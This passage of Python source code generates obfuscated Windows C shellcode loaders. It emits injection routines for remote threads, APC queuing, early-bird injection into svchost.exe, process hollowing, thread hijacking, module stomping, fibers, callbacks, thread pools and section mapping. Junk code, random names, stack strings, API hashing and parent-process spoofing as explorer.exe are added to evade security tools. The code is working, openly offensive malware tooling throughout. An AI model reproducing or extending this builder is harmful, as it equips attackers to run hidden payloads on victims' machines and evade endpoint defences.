    lines.append("    HANDLE %s = %s(PROCESS_ALL_ACCESS, FALSE, %s);" % (h, p['OpenProcess'], pv))
    lines.append("    if (!%s) return;" % h)
    lines.append("    void* %s = %s(%s, NULL, %s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, p['VirtualAllocEx'], h, l))
    lines.append("    if (!%s) { %s(%s); return; }" % (m, p['CloseHandle'], h))
    lines.append("    if (!%s(%s, %s, %s, %s, NULL)) { %s(%s); return; }" % (p['WriteProcessMemory'], h, m, s, l, p['CloseHandle'], h))
    if junk: lines.append(gen_junk_block())
    lines.append("    DWORD %s;" % o)
    lines.append("    if (!%s(%s, %s, %s, PAGE_EXECUTE_READ, &%s)) { %s(%s); return; }" % (p['VirtualProtectEx'], h, m, l, o, p['CloseHandle'], h))
    lines.append("    %s(%s, NULL, 0, (LPTHREAD_START_ROUTINE)%s, NULL, 0, NULL);" % (p['CreateRemoteThread'], h, m))
    lines.append("    %s(%s);" % (p['CloseHandle'], h))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_apc(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, ppid_spoof=False, find_pid_fn=None, cmdline_spoof_fn=None):
    fn = rand_id()
    s, l, g, pi, m, o = [rand_id() for _ in range(6)]
    api_list = ['CreateProcessA', 'VirtualAllocEx', 'WriteProcessMemory',
                'VirtualProtectEx', 'QueueUserAPC', 'ResumeThread', 'CloseHandle', 'TerminateProcess']
    if ppid_spoof:
        api_list.append('OpenProcess')
    p, rc = _multi_resolve(resolve_fn, api_list, syscall_map)
    lines = ["void %s(unsigned char* %s, unsigned int %s, char* %s) {" % (fn, s, l, g)]
    lines.extend(rc)

    if ppid_spoof and find_pid_fn:
        pp = rand_id()
        hp = rand_id()
        sie = rand_id()
        asz = rand_id()
        pn = rand_id(8)
        lines.append(c_stack_string("explorer.exe", pn))
        lines.append("    DWORD %s = %s(%s);" % (pp, find_pid_fn, pn))
        lines.append("    if (!%s) return;" % pp)
        lines.append("    HANDLE %s = %s(PROCESS_ALL_ACCESS, FALSE, %s);" % (hp, p['OpenProcess'], pp))
        lines.append("    if (!%s) return;" % hp)
        lines.append("    STARTUPINFOEXA %s;" % sie)
        lines.append("    ZeroMemory(&%s, sizeof(%s));" % (sie, sie))
        lines.append("    %s.StartupInfo.cb = sizeof(%s);" % (sie, sie))
        lines.append("    SIZE_T %s = 0;" % asz)
        lines.append("    InitializeProcThreadAttributeList(NULL, 1, 0, &%s);" % asz)
        lines.append("    %s.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, %s);" % (sie, asz))
        lines.append("    if (!%s.lpAttributeList) { %s(%s); return; }" % (sie, p['CloseHandle'], hp))
        lines.append("    InitializeProcThreadAttributeList(%s.lpAttributeList, 1, 0, &%s);" % (sie, asz))
        lines.append("    UpdateProcThreadAttribute(%s.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &%s, sizeof(HANDLE), NULL, NULL);" % (sie, hp))
        lines.append("    PROCESS_INFORMATION %s;" % pi)
        lines.append("    ZeroMemory(&%s, sizeof(%s));" % (pi, pi))
        if junk: lines.append(gen_junk_block())
        lines.append("    if (!%s(%s, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &%s.StartupInfo, &%s)) {" % (p['CreateProcessA'], g, sie, pi))
        lines.append("        DeleteProcThreadAttributeList(%s.lpAttributeList);" % sie)
        lines.append("        HeapFree(GetProcessHeap(), 0, %s.lpAttributeList);" % sie)
        lines.append("        %s(%s);" % (p['CloseHandle'], hp))
        lines.append("        return;")
        lines.append("    }")
    else:
        si = rand_id()
        lines.append("    STARTUPINFOA %s;" % si)
        lines.append("    PROCESS_INFORMATION %s;" % pi)
        lines.append("    ZeroMemory(&%s, sizeof(%s));" % (si, si))
        lines.append("    %s.cb = sizeof(%s);" % (si, si))
        lines.append("    ZeroMemory(&%s, sizeof(%s));" % (pi, pi))
        if junk: lines.append(gen_junk_block())
        lines.append("    if (!%s(%s, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &%s, &%s)) return;" % (p['CreateProcessA'], g, si, pi))
        hp = None
        sie = None

    if cmdline_spoof_fn:
        lines.append("    %s(%s.hProcess);" % (cmdline_spoof_fn, pi))
    lines.append("    void* %s = %s(%s.hProcess, NULL, %s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, p['VirtualAllocEx'], pi, l))
    lines.append("    if (!%s) { %s(%s.hProcess, 0); %s(%s.hThread); %s(%s.hProcess);" % (m, p['TerminateProcess'], pi, p['CloseHandle'], pi, p['CloseHandle'], pi))
    if ppid_spoof and sie:
        lines.append("        DeleteProcThreadAttributeList(%s.lpAttributeList); HeapFree(GetProcessHeap(), 0, %s.lpAttributeList); %s(%s);" % (sie, sie, p['CloseHandle'], hp))
    lines.append("        return; }")
    lines.append("    if (!%s(%s.hProcess, %s, %s, %s, NULL)) { %s(%s.hProcess, 0); %s(%s.hThread); %s(%s.hProcess);" % (p['WriteProcessMemory'], pi, m, s, l, p['TerminateProcess'], pi, p['CloseHandle'], pi, p['CloseHandle'], pi))
    if ppid_spoof and sie:
        lines.append("        DeleteProcThreadAttributeList(%s.lpAttributeList); HeapFree(GetProcessHeap(), 0, %s.lpAttributeList); %s(%s);" % (sie, sie, p['CloseHandle'], hp))
    lines.append("        return; }")
    lines.append("    DWORD %s;" % o)
    lines.append("    %s(%s.hProcess, %s, %s, PAGE_EXECUTE_READ, &%s);" % (p['VirtualProtectEx'], pi, m, l, o))
    if junk: lines.append(gen_junk_block())
    lines.append("    %s((PAPCFUNC)%s, %s.hThread, 0);" % (p['QueueUserAPC'], m, pi))
    lines.append("    %s(%s.hThread);" % (p['ResumeThread'], pi))
    lines.append("    %s(%s.hThread);" % (p['CloseHandle'], pi))
    lines.append("    %s(%s.hProcess);" % (p['CloseHandle'], pi))
    if ppid_spoof and sie:
        lines.append("    DeleteProcThreadAttributeList(%s.lpAttributeList);" % sie)
        lines.append("    HeapFree(GetProcessHeap(), 0, %s.lpAttributeList);" % sie)
        lines.append("    %s(%s);" % (p['CloseHandle'], hp))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_callback(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, cfg_fn=None):
    fn = rand_id()
    s, l, m, o = [rand_id() for _ in range(4)]
    p, rc = _multi_resolve(resolve_fn, ['VirtualAlloc', 'VirtualProtect', 'LoadLibraryA'], syscall_map)
    lines = ["void %s(unsigned char* %s, unsigned int %s) {" % (fn, s, l)]
    lines.extend(rc)
    u32 = rand_id(8)
    lines.append(c_stack_string("user32.dll", u32))
    lines.append("    %s(%s);" % (p['LoadLibraryA'], u32))
    ptr_ecw, r_ecw = gen_resolve_one(resolve_fn, 'EnumChildWindows')
    lines.append(r_ecw)
    lines.append("    if (!%s) return;" % ptr_ecw)
    if junk: lines.append(gen_junk_block())
    lines.append("    void* %s = %s(NULL, %s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, p['VirtualAlloc'], l))
    lines.append("    if (!%s) return;" % m)
    lines.append("    memcpy(%s, %s, %s);" % (m, s, l))
    lines.append("    DWORD %s;" % o)
    lines.append("    if (!%s(%s, %s, PAGE_EXECUTE_READ, &%s)) return;" % (p['VirtualProtect'], m, l, o))
    if cfg_fn:
        lines.append("    %s(%s, %s);" % (cfg_fn, m, l))
    if junk: lines.append(gen_junk_block())
    lines.append("    %s(NULL, (WNDENUMPROC)%s, 0);" % (ptr_ecw, m))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_fiber(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, cfg_fn=None):
    fn = rand_id()
    s, l, m, o, f = [rand_id() for _ in range(5)]
    p, rc = _multi_resolve(resolve_fn, ['ConvertThreadToFiber', 'VirtualAlloc', 'VirtualProtect',
                                         'CreateFiber', 'SwitchToFiber'], syscall_map)
    lines = ["void %s(unsigned char* %s, unsigned int %s) {" % (fn, s, l)]
    lines.extend(rc)
    if junk: lines.append(gen_junk_block())
    lines.append("    if (!%s(NULL)) return;" % p['ConvertThreadToFiber'])
    lines.append("    void* %s = %s(NULL, %s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, p['VirtualAlloc'], l))
    lines.append("    if (!%s) return;" % m)
    lines.append("    memcpy(%s, %s, %s);" % (m, s, l))
    lines.append("    DWORD %s;" % o)
    lines.append("    if (!%s(%s, %s, PAGE_EXECUTE_READ, &%s)) return;" % (p['VirtualProtect'], m, l, o))
    if cfg_fn:
        lines.append("    %s(%s, %s);" % (cfg_fn, m, l))
    if junk: lines.append(gen_junk_block())
    lines.append("    void* %s = %s(0, (LPFIBER_START_ROUTINE)%s, NULL);" % (f, p['CreateFiber'], m))
    lines.append("    if (!%s) return;" % f)
    lines.append("    %s(%s);" % (p['SwitchToFiber'], f))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_hijack(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None):
    fn = rand_id()
    s, l, pd, sn, te, ti, hp, m, o, ht, cx = [rand_id() for _ in range(11)]
    p, rc = _multi_resolve(resolve_fn, [
        'OpenProcess', 'VirtualAllocEx', 'WriteProcessMemory', 'VirtualProtectEx',
        'OpenThread', 'SuspendThread', 'GetThreadContext', 'SetThreadContext', 'ResumeThread',
        'CreateToolhelp32Snapshot', 'Thread32First', 'Thread32Next', 'CloseHandle', 'GetCurrentThreadId'
    ], syscall_map)
    lines = ["void %s(unsigned char* %s, unsigned int %s, DWORD %s) {" % (fn, s, l, pd)]
    lines.extend(rc)
    lines.append("    HANDLE %s = %s(0x00000004, 0);" % (sn, p['CreateToolhelp32Snapshot']))
    lines.append("    if (!%s || %s == INVALID_HANDLE_VALUE) return;" % (sn, sn))
    lines.append("    THREADENTRY32 %s;" % te)
    lines.append("    %s.dwSize = sizeof(%s);" % (te, te))
    lines.append("    DWORD %s = 0;" % ti)
    lines.append("    if (%s(%s, &%s)) {" % (p['Thread32First'], sn, te))
    lines.append("        do {")
    lines.append("            if (%s.th32OwnerProcessID == %s && %s.th32ThreadID != %s()) {" % (te, pd, te, p['GetCurrentThreadId']))
    lines.append("                %s = %s.th32ThreadID; break;" % (ti, te))
    lines.append("            }")
    lines.append("        } while (%s(%s, &%s));" % (p['Thread32Next'], sn, te))
    lines.append("    }")
    lines.append("    %s(%s);" % (p['CloseHandle'], sn))
    lines.append("    if (!%s) return;" % ti)
    if junk: lines.append(gen_junk_block())
    lines.append("    HANDLE %s = %s(PROCESS_ALL_ACCESS, FALSE, %s);" % (hp, p['OpenProcess'], pd))
    lines.append("    if (!%s) return;" % hp)
    lines.append("    void* %s = %s(%s, NULL, %s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, p['VirtualAllocEx'], hp, l))
    lines.append("    if (!%s) { %s(%s); return; }" % (m, p['CloseHandle'], hp))
    lines.append("    if (!%s(%s, %s, %s, %s, NULL)) { %s(%s); return; }" % (p['WriteProcessMemory'], hp, m, s, l, p['CloseHandle'], hp))
    lines.append("    DWORD %s;" % o)
    lines.append("    if (!%s(%s, %s, %s, PAGE_EXECUTE_READ, &%s)) { %s(%s); return; }" % (p['VirtualProtectEx'], hp, m, l, o, p['CloseHandle'], hp))
    lines.append("    HANDLE %s = %s(THREAD_ALL_ACCESS, FALSE, %s);" % (ht, p['OpenThread'], ti))
    lines.append("    if (!%s) { %s(%s); return; }" % (ht, p['CloseHandle'], hp))
    lines.append("    %s(%s);" % (p['SuspendThread'], ht))
    lines.append("    CONTEXT %s;" % cx)
    lines.append("    %s.ContextFlags = CONTEXT_FULL;" % cx)
    lines.append("    if (!%s(%s, &%s)) { %s(%s); %s(%s); %s(%s); return; }" % (p['GetThreadContext'], ht, cx, p['ResumeThread'], ht, p['CloseHandle'], ht, p['CloseHandle'], hp))
    lines.append("    %s.Rip = (DWORD64)%s;" % (cx, m))
    lines.append("    if (!%s(%s, &%s)) { %s(%s); %s(%s); %s(%s); return; }" % (p['SetThreadContext'], ht, cx, p['ResumeThread'], ht, p['CloseHandle'], ht, p['CloseHandle'], hp))
    if junk: lines.append(gen_junk_block())
    lines.append("    %s(%s);" % (p['ResumeThread'], ht))
    lines.append("    %s(%s);" % (p['CloseHandle'], ht))
    lines.append("    %s(%s);" % (p['CloseHandle'], hp))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_stomp(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, stomp_dll="xpsservices.dll", cfg_fn=None):
    fn = rand_id()
    s, l, md, dh, nh, sh, iv, tg, o, th = [rand_id() for _ in range(10)]
    p, rc = _multi_resolve(resolve_fn, ['LoadLibraryExA', 'VirtualProtect', 'CreateThread', 'WaitForSingleObject'], syscall_map)
    dll_var = rand_id(8)
    lines = ["void %s(unsigned char* %s, unsigned int %s) {" % (fn, s, l)]
    lines.extend(rc)
    lines.append(c_stack_string(stomp_dll, dll_var))
    if junk: lines.append(gen_junk_block())
    lines.append("    HMODULE %s = %s(%s, NULL, DONT_RESOLVE_DLL_REFERENCES);" % (md, p['LoadLibraryExA'], dll_var))
    lines.append("    if (!%s) return;" % md)
    lines.append("    PIMAGE_DOS_HEADER %s = (PIMAGE_DOS_HEADER)%s;" % (dh, md))
    lines.append("    PIMAGE_NT_HEADERS %s = (PIMAGE_NT_HEADERS)((unsigned char*)%s + %s->e_lfanew);" % (nh, md, dh))
    lines.append("    PIMAGE_SECTION_HEADER %s = IMAGE_FIRST_SECTION(%s);" % (sh, nh))
    lines.append("    for (int %s = 0; %s < %s->FileHeader.NumberOfSections; %s++) {" % (iv, iv, nh, iv))
    lines.append("        if (%s[%s].Characteristics & IMAGE_SCN_MEM_EXECUTE) {" % (sh, iv))
    lines.append("            if (%s[%s].Misc.VirtualSize < %s) continue;" % (sh, iv, l))
    lines.append("            void* %s = (unsigned char*)%s + %s[%s].VirtualAddress;" % (tg, md, sh, iv))
    lines.append("            DWORD %s;" % o)
    lines.append("            if (!%s(%s, %s, PAGE_READWRITE, &%s)) continue;" % (p['VirtualProtect'], tg, l, o))
    lines.append("            memcpy(%s, %s, %s);" % (tg, s, l))
    lines.append("            %s(%s, %s, PAGE_EXECUTE_READ, &%s);" % (p['VirtualProtect'], tg, l, o))
    if cfg_fn:
        lines.append("            %s(%s, %s);" % (cfg_fn, tg, l))
    if junk: lines.append(gen_junk_block())
    lines.append("            HANDLE %s = %s(NULL, 0, (LPTHREAD_START_ROUTINE)%s, NULL, 0, NULL);" % (th, p['CreateThread'], tg))
    if sleep_base:
        lines.append("            %s = %s;" % (sleep_base, tg))
        lines.append("            %s = %s;" % (sleep_size, l))
    else:
        lines.append("            if (%s) %s(%s, 0xFFFFFFFF);" % (th, p['WaitForSingleObject'], th))
    lines.append("            break;")
    lines.append("        }")
    lines.append("    }")
    lines.append("}")
    return fn, "\n".join(lines)

def gen_hollow(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, ppid_spoof=False, find_pid_fn=None, cmdline_spoof_fn=None):
    fn = rand_id()
    s, l, g, pi, ctx, ib, m, o = [rand_id() for _ in range(8)]
    api_list = [
        'CreateProcessA', 'VirtualAllocEx', 'WriteProcessMemory', 'VirtualProtectEx',
        'GetThreadContext', 'SetThreadContext', 'ResumeThread', 'ReadProcessMemory', 'CloseHandle',
        'TerminateProcess']
    if ppid_spoof:
        api_list.append('OpenProcess')
    p, rc = _multi_resolve(resolve_fn, api_list, syscall_map)
    ptr_nuv, r_nuv = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtUnmapViewOfSection")
    nuv_td = rand_id(8)
    lines = ["void %s(unsigned char* %s, unsigned int %s, char* %s) {" % (fn, s, l, g)]
    lines.extend(rc)
    lines.append(r_nuv)

    if ppid_spoof and find_pid_fn:
        pp = rand_id()
        hp = rand_id()
        sie = rand_id()
        asz = rand_id()
        pn = rand_id(8)
        lines.append(c_stack_string("explorer.exe", pn))
        lines.append("    DWORD %s = %s(%s);" % (pp, find_pid_fn, pn))
        lines.append("    if (!%s) return;" % pp)
        lines.append("    HANDLE %s = %s(PROCESS_ALL_ACCESS, FALSE, %s);" % (hp, p['OpenProcess'], pp))
        lines.append("    if (!%s) return;" % hp)
        lines.append("    STARTUPINFOEXA %s;" % sie)
        lines.append("    ZeroMemory(&%s, sizeof(%s));" % (sie, sie))
        lines.append("    %s.StartupInfo.cb = sizeof(%s);" % (sie, sie))
        lines.append("    SIZE_T %s = 0;" % asz)
        lines.append("    InitializeProcThreadAttributeList(NULL, 1, 0, &%s);" % asz)
        lines.append("    %s.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, %s);" % (sie, asz))
        lines.append("    if (!%s.lpAttributeList) { %s(%s); return; }" % (sie, p['CloseHandle'], hp))
        lines.append("    InitializeProcThreadAttributeList(%s.lpAttributeList, 1, 0, &%s);" % (sie, asz))
        lines.append("    UpdateProcThreadAttribute(%s.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &%s, sizeof(HANDLE), NULL, NULL);" % (sie, hp))
        si = None
        lines.append("    PROCESS_INFORMATION %s;" % pi)
        lines.append("    ZeroMemory(&%s, sizeof(%s));" % (pi, pi))
        if junk: lines.append(gen_junk_block())
        lines.append("    if (!%s(%s, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &%s.StartupInfo, &%s)) {" % (p['CreateProcessA'], g, sie, pi))
        lines.append("        DeleteProcThreadAttributeList(%s.lpAttributeList);" % sie)
        lines.append("        HeapFree(GetProcessHeap(), 0, %s.lpAttributeList);" % sie)
        lines.append("        %s(%s);" % (p['CloseHandle'], hp))
        lines.append("        return;")
        lines.append("    }")
    else:
        hp = None
        sie = None
        si = rand_id()
        lines.append("    STARTUPINFOA %s;" % si)
        lines.append("    PROCESS_INFORMATION %s;" % pi)
        lines.append("    ZeroMemory(&%s, sizeof(%s));" % (si, si))
        lines.append("    %s.cb = sizeof(%s);" % (si, si))
        lines.append("    ZeroMemory(&%s, sizeof(%s));" % (pi, pi))
        if junk: lines.append(gen_junk_block())
        lines.append("    if (!%s(%s, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &%s, &%s)) return;" % (p['CreateProcessA'], g, si, pi))

    if cmdline_spoof_fn:
        lines.append("    %s(%s.hProcess);" % (cmdline_spoof_fn, pi))

    def _hollow_cleanup():
        c = "%s(%s.hProcess, 0); %s(%s.hThread); %s(%s.hProcess);" % (
            p['TerminateProcess'], pi, p['CloseHandle'], pi, p['CloseHandle'], pi)
        if ppid_spoof and sie:
            c += " DeleteProcThreadAttributeList(%s.lpAttributeList); HeapFree(GetProcessHeap(), 0, %s.lpAttributeList); %s(%s);" % (sie, sie, p['CloseHandle'], hp)
        return c

    lines.append("    CONTEXT %s;" % ctx)
    lines.append("    %s.ContextFlags = CONTEXT_FULL;" % ctx)
    lines.append("    if (!%s(%s.hThread, &%s)) { %s return; }" % (p['GetThreadContext'], pi, ctx, _hollow_cleanup()))
    lines.append("    void* %s = NULL;" % ib)
    lines.append("    if (!%s(%s.hProcess, (void*)(%s.Rdx + 0x10), &%s, sizeof(void*), NULL)) { %s return; }" % (p['ReadProcessMemory'], pi, ctx, ib, _hollow_cleanup()))
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE, PVOID);" % nuv_td)
    lines.append("    if (%s) ((%s)%s)(%s.hProcess, %s);" % (ptr_nuv, nuv_td, ptr_nuv, pi, ib))
    lines.append("    void* %s = %s(%s.hProcess, %s, %s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, p['VirtualAllocEx'], pi, ib, l))
    lines.append("    if (!%s) %s = %s(%s.hProcess, NULL, %s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, m, p['VirtualAllocEx'], pi, l))
    lines.append("    if (!%s) { %s return; }" % (m, _hollow_cleanup()))
    lines.append("    if (!%s(%s.hProcess, %s, %s, %s, NULL)) { %s return; }" % (p['WriteProcessMemory'], pi, m, s, l, _hollow_cleanup()))
    lines.append("    DWORD %s;" % o)
    lines.append("    %s(%s.hProcess, %s, %s, PAGE_EXECUTE_READ, &%s);" % (p['VirtualProtectEx'], pi, m, l, o))
    if junk: lines.append(gen_junk_block())
    lines.append("    %s.Rip = (DWORD64)%s;" % (ctx, m))
    lines.append("    if (!%s(%s.hThread, &%s)) { %s return; }" % (p['SetThreadContext'], pi, ctx, _hollow_cleanup()))
    lines.append("    %s(%s.hThread);" % (p['ResumeThread'], pi))
    lines.append("    %s(%s.hThread);" % (p['CloseHandle'], pi))
    lines.append("    %s(%s.hProcess);" % (p['CloseHandle'], pi))
    if ppid_spoof and sie:
        lines.append("    DeleteProcThreadAttributeList(%s.lpAttributeList);" % sie)
        lines.append("    HeapFree(GetProcessHeap(), 0, %s.lpAttributeList);" % sie)
        lines.append("    %s(%s);" % (p['CloseHandle'], hp))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_pool(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, cfg_fn=None):
    fn = rand_id()
    cb_fn = rand_id()
    cb_inst = rand_id(6)
    cb_ctx = rand_id(6)
    cb_wk = rand_id(6)
    s, l, m, o = [rand_id() for _ in range(4)]
    p, rc = _multi_resolve(resolve_fn, ['VirtualAlloc', 'VirtualProtect'], syscall_map)
    p2, rc2 = _multi_resolve(resolve_fn, ['CreateThreadpoolWork', 'SubmitThreadpoolWork',
                                           'WaitForThreadpoolWorkCallbacks', 'CloseThreadpoolWork'])
    wk = rand_id(8)
    wrapper = "static void %s(void* %s, void* %s, void* %s) { ((void(*)())%s)(); }" % (
        cb_fn, cb_inst, cb_ctx, cb_wk, cb_ctx)
    lines = [wrapper, "", "void %s(unsigned char* %s, unsigned int %s) {" % (fn, s, l)]
    lines.extend(rc)
    lines.extend(rc2)
    if junk: lines.append(gen_junk_block())
    lines.append("    void* %s = %s(NULL, %s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, p['VirtualAlloc'], l))
    lines.append("    if (!%s) return;" % m)
    lines.append("    memcpy(%s, %s, %s);" % (m, s, l))
    if junk: lines.append(gen_junk_block())
    lines.append("    DWORD %s;" % o)
    lines.append("    if (!%s(%s, %s, PAGE_EXECUTE_READ, &%s)) return;" % (p['VirtualProtect'], m, l, o))
    if cfg_fn:
        lines.append("    %s(%s, %s);" % (cfg_fn, m, l))
    lines.append("    if (!%s || !%s || !%s || !%s) return;" % (
        p2['CreateThreadpoolWork'], p2['SubmitThreadpoolWork'],
        p2['WaitForThreadpoolWorkCallbacks'], p2['CloseThreadpoolWork']))
    lines.append("    void* %s = %s(%s, %s, NULL);" % (wk, p2['CreateThreadpoolWork'], cb_fn, m))
    lines.append("    if (!%s) return;" % wk)
    lines.append("    %s(%s);" % (p2['SubmitThreadpoolWork'], wk))
    if sleep_base:
        lines.append("    %s = %s;" % (sleep_base, m))
        lines.append("    %s = %s;" % (sleep_size, l))
    else:
        lines.append("    %s(%s, FALSE);" % (p2['WaitForThreadpoolWorkCallbacks'], wk))
    lines.append("    %s(%s);" % (p2['CloseThreadpoolWork'], wk))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_phantom(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, cfg_fn=None):
    fn = rand_id()
    s, l = rand_id(), rand_id()
    ptr_ncs, r_ncs = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtCreateSection")
    ptr_nmvos, r_nmvos = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtMapViewOfSection")
    ptr_numvos, r_numvos = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtUnmapViewOfSection")
    ptr_nc, r_nc = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtClose")
    td_ncs = rand_id(8)
    td_nmvos = rand_id(8)
    td_numvos = rand_id(8)
    td_nc = rand_id(8)
    hsec = rand_id(8)
    sec_sz = rand_id(8)
    rw_base = rand_id(8)
    rx_base = rand_id(8)
    vw_sz = rand_id(6)
    st = rand_id(6)
    rounded = rand_id(6)
    th = rand_id(8)
    p_ct, rc_ct = _multi_resolve(resolve_fn, ['CreateThread', 'WaitForSingleObject'], syscall_map)
    lines = ["void %s(unsigned char* %s, unsigned int %s) {" % (fn, s, l)]
    lines.append(r_ncs)
    lines.append(r_nmvos)
    lines.append(r_numvos)
    lines.append(r_nc)
    lines.extend(rc_ct)
    lines.append("    typedef LONG (NTAPI* %s)(PHANDLE,ACCESS_MASK,void*,PLARGE_INTEGER,ULONG,ULONG,HANDLE);" % td_ncs)
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,ULONG,ULONG,ULONG);" % td_nmvos)
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE,PVOID);" % td_numvos)
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE);" % td_nc)
    lines.append("    if (!%s || !%s || !%s || !%s) return;" % (ptr_ncs, ptr_nmvos, ptr_numvos, ptr_nc))
    if junk: lines.append(gen_junk_block())
    lines.append("    SIZE_T %s = (%s + 0xFFF) & ~(SIZE_T)0xFFF;" % (rounded, l))
    lines.append("    HANDLE %s = NULL;" % hsec)
    lines.append("    LARGE_INTEGER %s;" % sec_sz)
    lines.append("    %s.QuadPart = %s;" % (sec_sz, rounded))
    lines.append("    LONG %s = ((%s)%s)(&%s, 0x000F001Fu, NULL, &%s, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);" % (st, td_ncs, ptr_ncs, hsec, sec_sz))
    lines.append("    if (%s < 0 || !%s) return;" % (st, hsec))
    lines.append("    void* %s = NULL;" % rw_base)
    lines.append("    SIZE_T %s = 0;" % vw_sz)
    lines.append("    %s = ((%s)%s)(%s, (HANDLE)-1, &%s, 0, 0, NULL, &%s, 1, 0, PAGE_READWRITE);" % (st, td_nmvos, ptr_nmvos, hsec, rw_base, vw_sz))
    lines.append("    if (%s < 0) { ((%s)%s)(%s); return; }" % (st, td_nc, ptr_nc, hsec))
    lines.append("    memcpy(%s, %s, %s);" % (rw_base, s, l))
    if junk: lines.append(gen_junk_block())
    lines.append("    void* %s = NULL;" % rx_base)
    lines.append("    %s = 0;" % vw_sz)
    lines.append("    %s = ((%s)%s)(%s, (HANDLE)-1, &%s, 0, 0, NULL, &%s, 1, 0, PAGE_EXECUTE_READ);" % (st, td_nmvos, ptr_nmvos, hsec, rx_base, vw_sz))
    lines.append("    if (%s < 0) { ((%s)%s)((HANDLE)-1, %s); ((%s)%s)(%s); return; }" % (st, td_numvos, ptr_numvos, rw_base, td_nc, ptr_nc, hsec))
    lines.append("    ((%s)%s)((HANDLE)-1, %s);" % (td_numvos, ptr_numvos, rw_base))
    if cfg_fn:
        lines.append("    %s(%s, %s);" % (cfg_fn, rx_base, rounded))
    lines.append("    HANDLE %s = %s(NULL, 0, (LPTHREAD_START_ROUTINE)%s, NULL, 0, NULL);" % (th, p_ct['CreateThread'], rx_base))
    lines.append("    if (!%s) { ((%s)%s)((HANDLE)-1, %s); ((%s)%s)(%s); return; }" % (th, td_numvos, ptr_numvos, rx_base, td_nc, ptr_nc, hsec))
    if sleep_base:
        lines.append("    %s = %s;" % (sleep_base, rx_base))
        lines.append("    %s = %s;" % (sleep_size, rounded))
    else:
        lines.append("    %s(%s, 0xFFFFFFFF);" % (p_ct['WaitForSingleObject'], th))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_earlybird(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, ppid_spoof=False, find_pid_fn="", cfg_fn=None, cmdline_spoof_fn=None):
    fn = rand_id()
    s, l = rand_id(), rand_id()
    pi = rand_id(8)
    m = rand_id(8)
    o = rand_id(6)
    tgt = rand_id(8)
    api_list = [
        'CreateProcessA', 'VirtualAllocEx', 'WriteProcessMemory',
        'VirtualProtectEx', 'QueueUserAPC', 'ResumeThread', 'CloseHandle', 'TerminateProcess']
    if ppid_spoof:
        api_list.append('OpenProcess')
    p, rc = _multi_resolve(resolve_fn, api_list, syscall_map)
    lines = ["void %s(unsigned char* %s, unsigned int %s) {" % (fn, s, l)]
    lines.extend(rc)
    if junk: lines.append(gen_junk_block())
    lines.append(c_stack_string("C:\\Windows\\System32\\svchost.exe", tgt))

    if ppid_spoof and find_pid_fn:
        pp = rand_id()
        hp = rand_id()
        sie = rand_id()
        asz = rand_id()
        pn = rand_id(8)
        lines.append(c_stack_string("explorer.exe", pn))
        lines.append("    DWORD %s = %s(%s);" % (pp, find_pid_fn, pn))
        lines.append("    if (!%s) return;" % pp)
        lines.append("    HANDLE %s = %s(PROCESS_ALL_ACCESS, FALSE, %s);" % (hp, p['OpenProcess'], pp))
        lines.append("    if (!%s) return;" % hp)
        lines.append("    STARTUPINFOEXA %s;" % sie)
        lines.append("    ZeroMemory(&%s, sizeof(%s));" % (sie, sie))
        lines.append("    %s.StartupInfo.cb = sizeof(%s);" % (sie, sie))
        lines.append("    SIZE_T %s = 0;" % asz)
        lines.append("    InitializeProcThreadAttributeList(NULL, 1, 0, &%s);" % asz)
        lines.append("    %s.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, %s);" % (sie, asz))
        lines.append("    if (!%s.lpAttributeList) { %s(%s); return; }" % (sie, p['CloseHandle'], hp))
        lines.append("    InitializeProcThreadAttributeList(%s.lpAttributeList, 1, 0, &%s);" % (sie, asz))
